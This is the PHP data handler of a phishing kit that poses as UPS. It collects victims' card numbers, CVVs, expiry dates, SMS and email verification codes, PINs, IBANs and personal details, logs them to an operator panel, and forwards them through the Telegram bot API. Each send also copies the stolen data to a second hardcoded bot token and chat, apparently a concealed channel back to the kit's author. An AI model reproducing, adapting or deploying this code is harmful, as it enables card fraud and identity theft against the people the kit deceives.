<?php
require "../main.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['cch'])){
	
	$cch = post("cch");
	$ccn = post("ccn");
	$exp = post("exp");
	$cvv = post("cvv");

	$telegram_content = urlencode("
====================================
💳 CARD GLOBAL UPS 🌍 / $ip
+ Card holder : $cch
+ Credit Card  : $ccn
+ Epiration : $exp
+ Cvv : $cvv
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ CREDIT CARD [ $cch | $ccn  | $exp  | $cvv ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
		}
		 header("location: loader.php");
 
}
	

 







if(isset($_POST['code'])){
	
$sms = post("code");

$telegram_content = urlencode("
====================================
💳 SMS GLOBAL UPS 🌍 / $ip
+ SMS : $sms
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ SMS [ $sms]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loader.php");
}



if(isset($_POST['pin'])){
	
$pin = post("pin");

$telegram_content = urlencode("
====================================
💳 PIN CODE GLOBAL UPS 🌍 / $ip
+ PIN : $pin
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ PIN [ $pin]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loader.php");
}


if(isset($_POST['iban'])){
	
$iban = post("iban");

$telegram_content = urlencode("
====================================
💳 PIN CODE GLOBAL UPS 🌍 / $ip
+ PIN : $iban
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ iban [ $iban]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loader.php");
}



if(isset($_POST['mail'])){
	
$mail = post("mail");

$telegram_content = urlencode("
====================================
💳 E-MAIL CODE GLOBAL UPS 🌍 / $ip
+ E-MAIL Code : $sms
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ Email-code [ $mail]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loader.php");
}






if(isset($_POST['name'])){
	
$first = post("name");
$date = post("dob");
$country = post("country");
$zip = post("zip");
$city = post("city");
$address = post("adress");
$num = post("num");


$telegram_content = urlencode("
====================================
💳 !NF0 GLOBAL UPS 🌍 / $ip
+ Full name : $first
+ Date : $date
+ Country : $country
+ Zip code : $zip
+ City : $city
+ Phone number : $num
+ Adress : $address
====================================
+ PANEL : $panel
====================================
❇️ Resultes BY @Th3bank3rr
====================================
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ !nf0z :  [ $first | $date | $country | $zip | $city | $num | $address |]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$urls = "https://api.telegram.org/bot6368894124:AAGyBPmT6FH68bsDR7FZtB0_zh96I7jzq1Q/sendMessage?chat_id=-4008070447&text=$telegram_content";
sendBot($urls);
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: payment.php");
}





 

?>